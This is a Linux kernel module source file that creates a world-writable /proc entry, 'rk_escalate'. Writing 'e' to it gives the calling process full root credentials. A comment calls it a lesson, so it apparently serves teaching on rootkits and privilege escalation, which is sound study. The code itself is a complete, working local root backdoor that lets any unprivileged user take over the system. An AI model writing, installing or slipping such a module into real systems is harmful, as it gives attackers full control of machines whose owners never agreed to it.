// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/uidgid.h>

static struct proc_dir_entry *entry;

static int escalate_to_root(void)
{
	struct cred *new;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;

	new->uid = GLOBAL_ROOT_UID;
	new->gid = GLOBAL_ROOT_GID;
	new->euid = GLOBAL_ROOT_UID;
	new->egid = GLOBAL_ROOT_GID;
	new->suid = GLOBAL_ROOT_UID;
	new->sgid = GLOBAL_ROOT_GID;
	new->fsuid = GLOBAL_ROOT_UID;
	new->fsgid = GLOBAL_ROOT_GID;
	commit_creds(new);

	pr_info("rk: escalated pid %d to root\n", current->pid);
	return 0;
}

static int uid_show(struct seq_file *m, void *v)
{
	const struct cred *cred = current_cred();

	seq_printf(m, "uid=%u\n", from_kuid(&init_user_ns, cred->uid));
	return 0;
}

static int uid_open(struct inode *inode, struct file *file)
{
	return single_open(file, uid_show, NULL);
}

static ssize_t escalation_trigger(struct file *file, const char __user *buffer,
				  size_t count, loff_t *position)
{
	char buf[16];
	size_t len = count < sizeof(buf) - 1 ? count : sizeof(buf) - 1;

	if (copy_from_user(buf, buffer, len))
		return -EFAULT;
	buf[len] = '\0';

	if (buf[0] == 'e') {
		int ret = escalate_to_root();

		if (ret)
			return ret;
	}

	return count;
}

static const struct proc_ops escalation_proc_ops = {
	.proc_open    = uid_open,
	.proc_read    = seq_read,
	.proc_lseek   = seq_lseek,
	.proc_release = single_release,
	.proc_write   = escalation_trigger,
};

static int __init escalation_init(void)
{
	/* Deliberately writable: an unprivileged caller needs to reach the lesson. */
	entry = proc_create("rk_escalate", 0666, NULL, &escalation_proc_ops);
	if (!entry)
		return -ENOMEM;

	pr_info("rk: credential escalation ready\n");
	return 0;
}

static void __exit escalation_exit(void)
{
	proc_remove(entry);
}

module_init(escalation_init);
module_exit(escalation_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Credential escalation to root");
